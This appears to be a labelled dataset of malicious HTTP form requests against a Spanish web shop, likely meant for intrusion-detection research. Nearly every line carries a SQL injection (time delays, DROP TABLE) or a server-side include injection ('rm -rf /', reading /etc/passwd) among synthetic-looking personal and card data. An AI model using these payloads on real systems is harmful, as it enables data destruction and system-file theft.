+"registro | mckillop | margraviato | Leonor | Pantiga Corredor | miranoa@enla.web | 36674466T | Mencia Calderon, 170, 13B | Manzanares de Rioja | 05427 | Vizcaya');waitfor delay '0:0:15';-- | 7784731967679465 | Registrar HTTP/1.1"
+"registro | ofcparms | mutabIlidad | Petronio | Pedrol | cadoret@escuelamontessori.pa | 17229359J | Hermanas Sanchez Tamargo, 56  | Moreruela de los Infanzones | ','0');waitfor delay '0:0:15';-- | Huelva | 9991778846189173 | Registrar HTTP/1.1"
+"2<!--#EXEC cmd=""ls /""--> HTTP/1.1"
+entrar | ohio | acerrador'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | off | Entrar HTTP/1.1
+"registro | ','0','0','0','0');waitfor delay '0:0:15';-- | al55nza | Randolfo | Rovirola Noiran | semmelrogge@spainpharma.zm | 73500117Y | Pl. Aranjuez, S/N  | Sobremunt | 18127 | Tarragona | 1198702099336688 | Registrar HTTP/1.1"
+"insertar | 5934 | Confirmar','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+"<!--#include file=""archivo_secreto"" --> | 3086 | Pasar por caja HTTP/1.1"
+"registro | mirabell | implIcaNte','0');waitfor delay '0:0:15';-- | Yayn | Boliart Jubert | karlatos-woodcroft@joyaseleccion.fr | 90456703A | Avenida Vigo 194  | Olula de Castro | 07195 | Cuenca | 6879168763922210 | Registrar HTTP/1.1"
+"registro | winsberg | flagicio | Lihuel | Novell Abenoza | hasserman@clinicadentalsansalvador.ua | 95659491F | Federico Garcia Lorca, 132,  | Riudoms | 36960 | ';waitfor delay '0:0:15';-- | 1343774789684603 | Registrar HTTP/1.1"
+"entrar | gavens0 | <!--#EXEC cmd=""ls /""--> | on | Entrar HTTP/1.1"
+"insertar | ""><!--#EXEC cmd=""dir ""-->< | Pasar por caja HTTP/1.1"
+"2""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"
+"registro','0','0','0','0');waitfor delay '0:0:15';-- | lovell | 5gOtA15r0 | Mardoqueo | Zenteno Llunell | gebert.vrdoltak@intg.md | 55492932G | Conde De Las Infantas 30 8?F | Metauten | 10120 | Madrid | 6623716227816095 | Registrar HTTP/1.1"
+"entrar | shoouyu | 06434Q969o | on<!--#EXEC cmd=""ls /""--> | Entrar HTTP/1.1"
+"insertar | 88 | Confirmar<!--#EXEC cmd=""ls /""--> HTTP/1.1"
+';waitfor delay '0:0:15';-- | 88 | Confirmar HTTP/1.1
+"','0','0','0','0');waitfor delay '0:0:15';-- | 7990 | Pasar por caja HTTP/1.1"
+entrar | catlin | v76c088rA | off'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | Entrar HTTP/1.1
+"1','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+"<!--#EXEC cmd=""ls /""--> | 346 | Confirmar HTTP/1.1"
+"registro | <!--#include file=""archivo_secreto"" --> | idealismo | Ian | Sacota Xech | alland.soeltoft@aridossanchez.do | 28681618C | C/ Valencia S/N 11A | Pancorbo | 26321 | Alicante | 3366384544522158 | Registrar HTTP/1.1"
+"insertar | <!--#include file=""archivo_secreto"" --> | Confirmar HTTP/1.1"
+"registro | charko | entrevenimiento | Cayetano | Papiol Garriga | ruehmann.goodrow@cajucar.bz | 75246757A | C/ Sierra Maigmo, S/N, 1?D | Villa de Ves | 09343 | Guadalajara | 1828745224462815 | Registrar""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"
+"insertar | 5562<!--#include file=""archivo_secreto"" --> | Pasar por caja HTTP/1.1"
+"registro | schwenk | iNfINitIvO | Tarciano','0','0');waitfor delay '0:0:15';-- | Varela Pulido | strizhenova-boston@hrmsl.kh | 36249511Q | Barrio Vidal 132, 13?B | Rubite | 50160 | Zamora | 6295032148467406 | Registrar HTTP/1.1"
+"1 | Queso Manchego | 39 | 59 | <!--#EXEC cmd=""ls /""--> HTTP/1.1"
+"insertar | ','0','0','0');waitfor delay '0:0:15';-- | Pasar por caja HTTP/1.1"
+"entrar | cristi<!--#EXEC cmd=""ls /""--> | corac27o | on | Entrar HTTP/1.1"
+"2','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+entrar | frasco | .ag091766so | ';waitfor delay '0:0:15';-- | Entrar HTTP/1.1
+insertar'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | 7191 | Confirmar HTTP/1.1
+"entrar<!--#EXEC cmd=""ls /""--> | edik3 | a6mi9a2 | on | Entrar HTTP/1.1"
+"registro | watchorn | gin09r9n3 | Alcira | Marcapura Pachecote | wolheim@soyrojo.se | 79531407Y | ','0');waitfor delay '0:0:15';-- | Deleitosa | 49410 | Baleares (Illes) | 4881993166167995 | Registrar HTTP/1.1"
+"insertar | 8896','0','0');waitfor delay '0:0:15';-- | Confirmar HTTP/1.1"
+"registro | gamaleld | t54p-4l | Shunko | Volta Piriz | guarneros@elfisioencasa.eu | 78789686N | Menorca 13, 2?H | Villagonzalo','0','0','0','0');waitfor delay '0:0:15';-- | 31495 | Granada | 4253253341921904 | Registrar HTTP/1.1"
+2 | Queso Manchego | 39 | 76 | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1
+"insertar | 6071<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Confirmar HTTP/1.1"
+entrar | mobley | r10bo9b7 | ');waitfor delay '0:0:15';-- | Entrar HTTP/1.1
+"registro | nerby5 | te6b8anTe | Rosarito | Millan Guiral | goldsborough4@sevach.name | 47183982B | C/ Jardins Dels Gegants De Gracia 143, 11-H | Melgar de Abajo | 06228 | ');waitfor delay '0:0:15';-- | 9926995556034564 | Registrar HTTP/1.1"
+"insertar | 9853 | Pasar por caja','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+"registro | chatchai | chismorrear | Rachid | Mingo Elbaile | schkorski@elxxi.zr | 26852714F | Paraguay, 88, 5?E | Aulesti | ','0','0','0','0');waitfor delay '0:0:15';-- | La Rioja | 2647099047093404 | Registrar HTTP/1.1"
+entrar | patricio | galo1he0o | ';waitfor delay '0:0:15';-- | Entrar HTTP/1.1
+"insertar','0','0');waitfor delay '0:0:15';-- | 2789 | Pasar por caja HTTP/1.1"
+"<!--#EXEC cmd=""ls /""--> | chetan | tontuela | on | Entrar HTTP/1.1"
+"registro""><!--#EXEC cmd=""dir ""-->< | tiong-ho | an1l5m9no | Hadasa | Subias | parada.biuchet4@aulahost.gw | 79845869N | Jacinto Benavente, 165 7F | Herreruela | 11330 | Teruel | 4461899477803914 | Registrar HTTP/1.1"
+insertar'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | 3714 | Confirmar HTTP/1.1
+"registro | charla | hi09otismo | Zita | Puerto | robb-ghostley@botilleria.com.sb','0');waitfor delay '0:0:15';-- | 09531645P | Calle Dresde 25 6?D | Molezuelas de la Carballeda | 08281 | Baleares (Illes) | 7133217385805670 | Registrar HTTP/1.1"
+"registro""><!--#EXEC cmd=""dir ""-->< | kanya | trasladadora | Angelo | Goya Asensio | bowers@puntodevistafotografia.gf | 56007542N | C/ Baja 58, 1?H | Helechosa de los Montes | 10181 | Valencia | 8914897432837758 | Registrar HTTP/1.1"
+"registro | kanya | trasladadora | Angelo | Goya Asensio | bowers@puntodevistafotografia.gf | 56007542N | C/ Baja 58, 1?H | Helechosa de los Montes | 10181 | Valencia | 8914897432837758 | ','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+"""><!--#EXEC cmd=""dir ""-->< | swen | incisorio | off | Entrar HTTP/1.1"
+"registro | nitin | r4mitir | Lionel | Teixidor Modrego | creach@vindexexpo.gr | 37118814B | C/ Joaquin Arjona 70,  | Rionegro del Puente | 49639 | Barcelona | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Registrar HTTP/1.1"
+"3 | Queso Manchego | 39 | 86 | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"
+';waitfor delay '0:0:15';-- | 9468 | Pasar por caja HTTP/1.1
+"registro | nill | 2739n83d$46 | Yael | Paladell Perramon | brandauer@barnicesuv.td | 31914466B | Calle Corpo Santo, 11 6G | Canales de la Sierra | 22220 | <!--#EXEC cmd=""ls /""--> | 3350910813018179 | Registrar HTTP/1.1"
+"<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | darb2 | h4_Bi651A2 | on | Entrar HTTP/1.1"
+"insertar<!--#include file=""archivo_secreto"" --> | 4179 | Confirmar HTTP/1.1"
+"registro | winters | pat!entemente | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Mollejasl | wepper.cros@miplat.kh | 91976235V | Calle San Froilan 74  | San Miguel de Bernuy | 06410 | Barcelona | 3866167824231022 | Registrar HTTP/1.1"
+"entrar | chandras','0','0','0','0');waitfor delay '0:0:15';-- | h+olgona | on | Entrar HTTP/1.1"
+insertar | 3650'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | Confirmar HTTP/1.1
+"entrar | corvo | 4mbel0c11362<!--#EXEC cmd=""ls /""--> | off | Entrar HTTP/1.1"
+"entrar | nezm | 1Eb5l0e | off | Entrar<!--#EXEC cmd=""ls /""--> HTTP/1.1"
+"insertar | 810 | <!--#EXEC cmd=""ls /""--> HTTP/1.1"
+"registro | bourk | acoMoDamIEnTO | Rafferty<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Aca Isach | lafuret@cortinas-de-aire.ai | 56038958X | Gijon, 93, 6?E | Pozuelo | 41749 | Barcelona | 4929562421029680 | Registrar HTTP/1.1"
+"registro | crafton | p2_l5ote | Peregrina | Mengual Bartumeu | feliciano@atorre.mobi | 80328105F | Calle Zurbaran, 131,  | ','0','0');waitfor delay '0:0:15';-- | 48195 | Sevilla | 4168827609798795 | Registrar HTTP/1.1"
+"registro | lachance | su5a | Rogato | Cucarell Caridad | zmed@tabernarinconete.uk | 19477061V';waitfor delay '0:0:15';-- | Manuel Paez Xaramillo 33, 6B | Estella/Lizarra | 26321 | Tarragona | 9995470732934706 | Registrar HTTP/1.1"
+"entrar','0','0','0','0');waitfor delay '0:0:15';-- | zaretsky | 40c7c0o | off | Entrar HTTP/1.1"
+entrar | durward | cOrDElAzO | on | ');waitfor delay '0:0:15';-- HTTP/1.1
+registro | lysinger | D9SOr9an21a2oR | Giovana | Planelles Neris | measor.barezewska@enlanzarote.com.gq | 54498003D | C/ Fuensanta 41  | ';waitfor delay '0:0:15';-- | 32650 | Huesca | 5070328292613697 | Registrar HTTP/1.1
+"registro | nady | 9va3831','0','0');waitfor delay '0:0:15';-- | Shirley | Urbaez Mariangel | erlich-jarrel@modeloscaninos.ni | 39759775C | Algarrobo 197 3?F | Navalonguilla | 50268 | Segovia | 5083698855321760 | Registrar HTTP/1.1"
+'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | 5080 | Pasar por caja HTTP/1.1
+"registro | <!--#EXEC cmd=""ls /""--> | e8c5mulg055r | Sindulfo | Labastie Princep | beckley.sone@sayuela.ge | 96517735Y | Carrer Marges 174 9B | Villanueva del Trabuco | 05152 | Tarragona | 1337485764739687 | Registrar HTTP/1.1"
+"entrar | perkins','0','0','0','0');waitfor delay '0:0:15';-- | 7ad524z | off | Entrar HTTP/1.1"
+insertar | 1980 | ');waitfor delay '0:0:15';-- HTTP/1.1
+"insertar | 9671 | ""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"
+"registro | <!--#include file=""archivo_secreto"" --> | pirr7n108 | Siro | Casaramon Tetatzin | malcolm_motaung@enlanzarote.com.yu | 30635705G | Cristo Rey, 59, 2B | Arenales de San Gregorio | 24745 | Huelva | 2796424278292099 | Registrar HTTP/1.1"
+"insertar | 4628 | Confirmar""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"
+entrar | pagi | refr2nd0 | off');waitfor delay '0:0:15';-- | Entrar HTTP/1.1
+"entrar | lemmie | InteMPesTI+vo | ','0','0','0','0');waitfor delay '0:0:15';-- | Entrar HTTP/1.1"
+entrar | schlacht | 43s8a | off | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1
+"registro | eamonn | 673que422 | Arador | Gala Vaquer | killorin@lodgeinmadrid.gl | 38367717Z | Grup De La Torre Lloveta 145  | Huerta de Rey | 31133 | Huesca | 5414663163826513 | ','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+entrar'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | chaar | pe4ibl171o | on | Entrar HTTP/1.1
+'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | chaar | pe4ibl171o | on | Entrar HTTP/1.1
+insertar'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | 7701 | Confirmar HTTP/1.1
+"insertar | 3858 | Pasar por caja<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"
+';waitfor delay '0:0:15';-- | 3858 | Pasar por caja HTTP/1.1
+"entrar | faez | 9fi247A | ','0','0','0','0');waitfor delay '0:0:15';-- | Entrar HTTP/1.1"
+"entrar | girouard | Disgu5TAd1','0','0','0');waitfor delay '0:0:15';-- | off | Entrar HTTP/1.1"
+"insertar | 622<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Pasar por caja HTTP/1.1"
+');waitfor delay '0:0:15';-- | 622 | Pasar por caja HTTP/1.1
+entrar | rizzardi | 332G3le8a | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | Entrar HTTP/1.1
+"registro','0','0');waitfor delay '0:0:15';-- | gerhardt8 | pizmie+nta | Yamila | Cardalliaguet Yescas | armantel@laspruebascongaseosa.vg | 65724136A | Castro Canseco 8 5?H | Oria | 17538 | Albacete | 2877016523183053 | Registrar HTTP/1.1"
+"insertar | 3076 | ','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+"registro | xi-xian9'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | p?erspicacidad | Geraldo | Pedrol | chalon@ingenelec.gl | 10207822P | C/ Paloma, 197  | Laguna Dalga | 47520 | Pontevedra | 3590940446144864 | Registrar HTTP/1.1"
+"insertar<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | 5191 | Confirmar HTTP/1.1"
+"insertar | 5191 | ','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+insertar | 8865 | ');waitfor delay '0:0:15';-- HTTP/1.1
+"entrar | ','0','0','0');waitfor delay '0:0:15';-- | espesamente | on | Entrar HTTP/1.1"
+"entrar | krishna | 3o?964I7A1 | on | Entrar<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"
+"entrar | moyna | arable | on | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"
+"3 | Queso Manchego | 39 | 67 | <!--#EXEC cmd=""ls /""--> HTTP/1.1"
+"','0');waitfor delay '0:0:15';-- | 8384 | Confirmar HTTP/1.1"
+insertar | 6541';waitfor delay '0:0:15';-- | Confirmar HTTP/1.1
+insertar | 4633';waitfor delay '0:0:15';-- | Confirmar HTTP/1.1
+insertar | 5698 | Pasar por caja';waitfor delay '0:0:15';-- HTTP/1.1
+"entrar','0','0','0');waitfor delay '0:0:15';-- | krowlek | veintidoseno | off | Entrar HTTP/1.1"
+"insertar | <!--#include file=""archivo_secreto"" --> | Pasar por caja HTTP/1.1"
+"insertar | 2426 | Confirmar','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+"entrar | dionysus | vuesa | on','0','0','0','0');waitfor delay '0:0:15';-- | Entrar HTTP/1.1"
+"entrar | <!--#include file=""archivo_secreto"" --> | juma | on | Entrar HTTP/1.1"
+"registro | torsten | quienq!uier | Ceciliano | De la Llave Graell | tambor@archivodeimagenes.mu | 79001087C | C/ Recanto Da Mapoula 87 8?A | Luzaide/Valcarlos | 33610 | Madrid | 3747055026532862','0');waitfor delay '0:0:15';-- | Registrar HTTP/1.1"
+"registro | torsten | quienq!uier | Ceciliano | De la Llave Graell | tambor@archivodeimagenes.mu | 79001087C | C/ Recanto Da Mapoula 87 8?A | ','0','0');waitfor delay '0:0:15';-- | 33610 | Madrid | 3747055026532862 | Registrar HTTP/1.1"
+"entrar | corace | ahorrAdOr | ""><!--#EXEC cmd=""dir ""-->< | Entrar HTTP/1.1"
+insertar | ';waitfor delay '0:0:15';-- | Confirmar HTTP/1.1
+"registro | moeschet | FAstiD?Ioso | VahidReza | Toral Pine | uray@hosterialasmajadillas.pt | 79928493C | Dido 162,  | Aldeanueva de Ebro | 50001""><!--#EXEC cmd=""dir ""-->< | Madrid | 6010532265403807 | Registrar HTTP/1.1"
+"entrar | ranbir | ','0');waitfor delay '0:0:15';-- | off | Entrar HTTP/1.1"
+"insertar | 5716 | ','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+entrar | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | caLabrotar | on | Entrar HTTP/1.1
+"insertar | 7988','0','0','0');waitfor delay '0:0:15';-- | Confirmar HTTP/1.1"
+"3 | Queso Manchego | 39 | 28 | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"
+"entrar | sturrock | 60509etr4 | off','0','0','0','0');waitfor delay '0:0:15';-- | Entrar HTTP/1.1"
+"registro | gray | 2s4e49 | Sadao | Mengual Bartumeu | mckinnell@arvigar.eu | 43595909F | Calle Arenal 153,  | Hornos de Moncalvillo','0','0','0','0');waitfor delay '0:0:15';-- | 34349 | Granada | 4118559502333875 | Registrar HTTP/1.1"
+"entrar | wing-man7""><!--#EXEC cmd=""dir ""-->< | edific9r | on | Entrar HTTP/1.1"
+"entrar | heinonen | ','0','0');waitfor delay '0:0:15';-- | on | Entrar HTTP/1.1"
+"');waitfor delay '0:0:15';-- | linebarg | 6A6ejo | Adiberto | Baro Guizasola | knoch@cortinasartesol.rs | 40660740Y | Calle Rio Nervion, 124  | Villalbilla | 10269 | Asturias | 3612762380089374 | Registrar HTTP/1.1"
+"registro | whalen54 | guapote | ','0');waitfor delay '0:0:15';-- | Agea Genova | fegan@unidadesdeventilacion.az | 39065739D | Fortaleza Hacho 199 11H | Espinosa de los Monteros | 11610 | Cuenca | 3212381335432418 | Registrar HTTP/1.1"
+"registro | winnie | 1ArZ5ElA | Pomponio | Aboitiz Monestel | mcnaughton@queinvento.gg<!--#include file=""archivo_secreto"" --> | 86852947W | Calle Gerardo Rueda, 68, 3?C | Foradada | 43411 | Badajoz | 4587587495208642 | Registrar HTTP/1.1"
+"<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | world.fa | entremeter | on | Entrar HTTP/1.1"
+"registro | jocelyn | v821ri8 | Raven | Rambla Jalencas<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | bourdette@sexl.ro | 66518253E | C/ Fuerte Isabel Ii, 78 3?C | Sando | 50088 | Girona | 0028019013829640 | Registrar HTTP/1.1"
+"2 | Vino Rioja | 85 | 83 | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"
+entrar | takagi71 | b6e | ');waitfor delay '0:0:15';-- | Entrar HTTP/1.1
+"entrar | ""><!--#EXEC cmd=""dir ""-->< | 1Ece57aL | off | Entrar HTTP/1.1"
+insertar'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | 3532 | Pasar por caja HTTP/1.1
+insertar | 1063 | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1
+"entrar | jeavons6 | empapuciar | off | Entrar','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+"insertar | 1202<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Pasar por caja HTTP/1.1"
+"insertar | 4236 | <!--#include file=""archivo_secreto"" --> HTTP/1.1"
+"entrar | buzzy','0','0','0','0');waitfor delay '0:0:15';-- | IMpr37E4197d9 | on | Entrar HTTP/1.1"
+insertar | 4344 | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1
+"entrar | crigger | AcRIBaDora | ','0','0');waitfor delay '0:0:15';-- | Entrar HTTP/1.1"
+"insertar | 6771 | ""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"
+"entrar | <!--#EXEC cmd=""ls /""--> | +ad7quie7 | on | Entrar HTTP/1.1"
